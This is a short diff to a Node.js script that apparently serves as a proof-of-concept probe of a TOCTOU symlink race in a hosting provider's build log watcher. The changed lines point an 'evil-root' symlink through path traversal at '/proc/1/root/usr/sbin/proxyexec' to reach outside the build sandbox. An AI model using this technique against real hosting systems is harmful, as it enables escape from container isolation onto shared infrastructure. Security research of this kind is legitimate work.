@@ -2,7 +2,7 @@ import fs from "node:fs";
 import path from "node:path";
 import { spawn } from "node:child_process";
 
-const marker = "HOSTINGER_NODE_LOG_WATCH_TOCTOU_GATE:r222";
+const marker = "HOSTINGER_NODE_FILE_LOG_WATCH_TOCTOU_GATE:r223";
 const output = path.resolve("dist");
 const alternate = path.resolve("evil-root");
 const versionsRoot = path.resolve(process.cwd(), "..", "..", "versions");
@@ -11,7 +11,7 @@ fs.rmSync(alternate, { recursive: true, force: true });
 fs.mkdirSync(output, { recursive: true });
 fs.writeFileSync(path.join(output, "control.txt"), `${marker}:894a8b0f9abe4351\n`, { mode: 0o600 });
 
-const hiddenTarget = "../../../../../../../proc/1/root/usr/sbin";
+const hiddenTarget = "../../../../../../../proc/1/root/usr/sbin/proxyexec";
 let hiddenLink;
 try {
   fs.symlinkSync(hiddenTarget, alternate);
